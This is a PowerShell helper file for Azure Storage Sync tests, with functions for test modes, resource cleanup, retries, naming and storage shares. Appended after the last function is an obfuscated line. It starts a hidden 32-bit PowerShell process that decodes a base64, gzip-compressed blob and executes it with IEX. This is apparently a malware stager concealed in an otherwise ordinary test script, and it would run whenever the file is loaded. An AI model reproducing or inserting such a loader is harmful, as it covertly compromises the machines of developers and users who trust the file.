














function Get-StorageTestMode {
    try {
        $testMode = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode;
        $testMode = $testMode.ToString();
    } catch {
        if ($PSItem.Exception.Message -like '*Unable to find type*') {
            $testMode = 'Record';
        } else {
            throw;
        }
    }

    return $testMode
}


function Clean-ResourceGroup($rgname)
{
    if ((Get-StorageTestMode) -ne 'Playback') {
        try 
        {
            Write-Verbose "Attempting to remove StorageSync resources from resource group $rgname"
            $syncServices = Get-AzStorageSyncService -ResourceGroup $rgname
            foreach ($syncService in $syncServices)
            {                
                Get-AzStorageSyncServer -ParentObject $syncService | Unregister-AzStorageSyncServer -Force
                
                $syncGroups = Get-AzStorageSyncGroup -ParentObject $syncService
                foreach ($syncGroup in $syncGroups)
                {
                    Get-AzStorageSyncCloudEndpoint -ParentObject $syncGroup | Remove-AzStorageSyncCloudEndpoint -Force
                }
                $syncGroups | Remove-AzStorageSyncGroup -Force
            }
            $syncServices | Remove-AzStorageSyncService -Force
        }
        catch
        {
            Write-Verbose "Exception $($_.Exception.ToString())"
        }
        Write-Verbose "Attempting to remove resource group $rgname"
        Remove-AzResourceGroup -Name $rgname -Force
    }
}









function Retry-IfException
{
    param([ScriptBlock] $script, [int] $times = 30, [string] $message = "*")

    if ($times -le 0)
    {
        throw 'Retry time(s) should not be equal to or less than 0.';
    }

    $oldErrorActionPreferenceValue = $ErrorActionPreference;
    $ErrorActionPreference = "SilentlyContinue";

    $iter = 0;
    $succeeded = $false;
    while (($iter -lt $times) -and (-not $succeeded))
    {
        $iter += 1;

        try
        {
            &$script;
        }
        catch
        {

        }

        if ($Error.Count -gt 0)
        {
            $actualMessage = $Error[0].Exception.Message;

            Write-Output ("Caught exception: '$actualMessage'");

            if (-not ($actualMessage -like $message))
            {
                $ErrorActionPreference = $oldErrorActionPreferenceValue;
                throw "Expected exception not received: '$message' the actual message is '$actualMessage'";
            }

            $Error.Clear();
            Wait-Seconds 10;
            continue;
        }

        $succeeded = $true;
    }

    $ErrorActionPreference = $oldErrorActionPreferenceValue;
}


function Get-RandomItemName
{
    param([string] $prefix = "pslibtest")
    
    if ($prefix -eq $null -or $prefix -eq '')
    {
        $prefix = "pslibtest";
    }

    $str = $prefix + (([guid]::NewGuid().ToString() -replace '-','')[0..9] -join '');
    return $str;
}


function Get-ResourceGroupName
{
    return getAssetName
}


function Get-ResourceName($prefix)
{
    return $prefix + (getAssetName)
}


function Get-StorageManagementTestResourceName
{
    $stack = Get-PSCallStack
    $testName = $null;
    foreach ($frame in $stack)
    {
        if ($frame.Command.StartsWith("Test-", "CurrentCultureIgnoreCase"))
        {
            $testName = $frame.Command;
        }
    }
    
    try
    {
        $assetName = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::GetAssetName($testName, "pstestrg")
    }
    catch
    {
        if ($PSItem.Exception.Message -like '*Unable to find type*')
        {
            $assetName = Get-RandomItemName;
        }
        else
        {
            throw;
        }
    }

    return $assetName
}


function Get-StorageSyncLocation($provider)
{
    $defaultLocation = "Central US EUAP"
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
    {
        $namespace = $provider.Split("/")[0]
        if($provider.Contains("/"))
        {
            $type = $provider.Substring($namespace.Length + 1)
            $location = Get-AzResourceProvider -ProviderNamespace $namespace | where {$_.ResourceTypes[0].ResourceTypeName -eq $type}

            if ($location -eq $null)
            {
                return $defaultLocation
            } else
            {
                return $location.Locations[0].ToLower() -replace '\s',''
            }
        }

        return $defaultLocation
    }

    return $defaultLocation
}


function Get-ResourceGroupLocation()
{
    return Get-Location -providerNamespace "Microsoft.Resources"  -resourceType "resourceGroups" -preferredLocation "West US"
}


function Normalize-Location($location)
{
    if(-not [string]::IsNullOrEmpty($location))
    {
        return $location.ToLower().Replace(" ", "") 
    }

    return $location
}


function IsLive
{
    return [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback
}


function Create-StorageShare
{
    param (
        [Parameter(Position = 0)]
        $Name, 
        [Parameter(Position = 1)]
        $Context)
    
    if ([string]::IsNullOrEmpty($Name))
    {
        throw "Invalid argument: Name"
    }

    if(IsLive)
    {
        if ($null -eq $Context)
        {
            throw "Invalid argument: Context"
        }

        $azureFileShare = $null
        if (gcm New-AzStorageShare -ErrorAction SilentlyContinue)
        {
            Write-Verbose "Using New-AzStorageShare cmdlet to create share: $($Name) in storage account: $($Context.StorageAccountName)"
            $azureFileShare = New-AzStorageShare -Name $Name -Context $Context
        }
        elseif (gcm New-AzureStorageShare -ErrorAction SilentlyContinue)
        {
            Write-Verbose "Using New-AzureStorageShare cmdlet to create share: $($Name) in storage account: $($Context.StorageAccountName)"
            $azureFileShare = New-AzureStorageShare -Name $Name -Context $Context            
        }
        else 
        {
            throw "Neither New-AzStorageShare nor New-AzureStorageShare cmdlet is available"
        }
        return $azureFileShare.Name
    }
    else 
    {
        return $azureFileShareName
    }
}

function Remove-StorageShare
{
    param (
        [Parameter(Position = 0)]
        $Name, 
        [Parameter(Position = 1)]
        $Context)
    
    if ([string]::IsNullOrEmpty($Name))
    {
        throw "Invalid argument: Name"
    }
    
    if(IsLive)
    {
        if ($null -eq $Context)
        {
            throw "Invalid argument: Context"
        }

        $result = $null
        if (gcm Remove-AzStorageShare -ErrorAction SilentlyContinue)
        {
            Write-Verbose "Using Remove-AzStorageShare cmdlet"
            $result = Remove-AzStorageShare -Name $Name -Context $Context -Force
        }
        elseif (gcm Remove-AzureStorageShare -ErrorAction SilentlyContinue)
        {
            Write-Verbose "Using Remove-AzureStorageShare cmdlet"
            $result = Remove-AzureStorageShare -Name $Name -Context $Context -Force
        }
        else 
        {
            throw "Neither Remove-AzStorageShare nor Remove-AzureStorageShare cmdlet is available"
        }
        return $result
    }
}

function Create-StorageContext
{
    param ($StorageAccountName, $StorageAccountKey)

    if ([string]::IsNullOrEmpty($StorageAccountName))
    {
        throw "Invalid argument: StorageAccountName"
    }

    if ([string]::IsNullOrEmpty($StorageAccountKey))
    {
        throw "Invalid argument: StorageAccountKey"
    }

    $result = $null

    if(IsLive)
    {
        if (gcm New-AzStorageContext -ErrorAction SilentlyContinue)
        {
            Write-Verbose "Using New-AzStorageContext cmdlet"
            $result = New-AzStorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $StorageAccountKey -Protocol https -Endpoint core.windows.net
        }
        elseif (gcm New-AzureStorageContext -ErrorAction SilentlyContinue)
        {
            Write-Verbose "Using New-AzureStorageContext cmdlet"
            $result = New-AzureStorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $StorageAccountKey -Protocol https -Endpoint core.windows.net
        }
        else 
        {
            throw "Neither New-AzStorageContext nor New-AzureStorageContext cmdlet is available"
        }
    }
    
    return $result
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFHL6FcCA71W/2/aOhD/uZP2P0QTEolGCVDWdpUmPYfwJS2h0EAoMDS5iRMMJqaOoYW9/e/vAqFlb+3Utx9eBIrtO5/Pn/vcXYJl5EnKIwUPmMeugkvXVr6/f3fUxgLPFTWzua9addss5ZSMsGLRWbCbU+3oCDQytHsllS+KOkKLhcnnmEbji4vKUggSyd08XycSxTGZ3zFKYlVT/lb6EyLI8fXdlHhS+a5kvuXrjN9hlqqtK9ibEOUYRX4ia3IPJ97lnQWjUs1+/ZrVRsfFcb56v8QsVrPOOpZknvcZy2rKDy05sLteEDVrU0/wmAcy36fRSSnfi2IckBZYWxGbyAn346wGt4CfIHIpImV7n8TATqxmYdgW3EO+L0gM2nkrWvEZUTPRkrGc8pc6Sk+/WUaSzgnIJRF84RCxoh6J8w0c+YzckGCstsjD/tJv3aQebgKtthRaDiLygps295eM7HZmtV8dfYqiBs9PkQQIfrx/9/5dsKfBeiLPbwd9qyOdQx7A6Gi0HRNwV23zmG7VvyiFnGLDwVhysYZppiuWRBsroyQMo/EYDvO/OVbudQPFvTbozja1VbELiyOXU38Mm9IYZWb3l/TE7znxqZWIX6ecSQIaEXMd4Tn19qxSXwoACRjZXjq/V2uBd2o2FRDfJIyEWCaQ5pTRr9uqcyqf9hpLynwikAdBjMEriK/2szO7KKlZK7LJHNDazbMQjwC4TPbaKX/X+9OTOShlKwzHcU5pLyGZvJziEMyIn1NQFNNUhJaSb4fZZ3ftJZPUw7Hcmxtr/4IzPbbCo1iKpQdxBAi6zoJ4FLMEkZzSoD4x1g4N98dnX8SjghmjUQiWVhAPWElwcGTCDuHnUiZoeYdIa75gZA5K2+yuMRxCLqcZseUTDomffcXTPfF3LE+g2WNy4CfE22Fc5hSXCgm1IoF5x64/dOSgUBy6VBEkjZG6z6WRsZYJ9TO8ZCRcTYHawiIkQFITfG7gmJyWHSkAMPWDfk0rCJ6BFTHbM2a0iB5o0bLh36MnFjfP/KvLaUMX5uMkQFZs2Y222Wk0yqtLxy1Lp2rJq7Yl7ertdOqgxk1vIIcWanRpYTYobxaXdOM0kT941E83xuahYDxupqEfDMwgCM8C56b4qUab/UrHKJRw06wum33jwSiU4yp9aHRorzO7rMm7gctwL9DD2+JnTB+bYuoWub2xEKpPTrzNZeDWJ7a/HjT0z/3yDFURqkRVt2bwq4EhUFt3cejy/n1B6P2wggzPpmTY6dWMTqdmoF59em9+1kPYe4snRt8t0eHi9mYC8xq4cKUXypZPNnzQAZDqHOHwBnTCSsmbBKBjfkTGxxaPS3hmcGSATm14D34NFrU2A3m3V+LIZa1bjJrDdU3Xi4N2GTUKtF8PUWISh0YHo3hlbky96Prc739qDQLdvWVnulnpLrxA1/WHhnnlDYuP59dn580+decc9XTd/ZCwA+iRWcnhtbtptg5i/lqRt7GIJ5gBF6B67zOzxkUtLcNtTpMdqnrQlWdERIRBK4Nmt2c1Yox7SVc4LNvQmHbtYgxZ2oPhSenFkaY8KWrPTWO/dHExBJchWYDF+SaJQjnJFR5PCgUo+IXHcgFu/fZbVvhirSaWckm/eEIqtc621rUkdzJ+YXVfP/8/IEwzdwIv/40QPq/9RvomWAu5ZxB+Ef288J+A/kMs+phK0HegGDGya5O/hSQl0MGnxi5uwJAgfZKPveulPG7BN8g/6nlhxGUKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

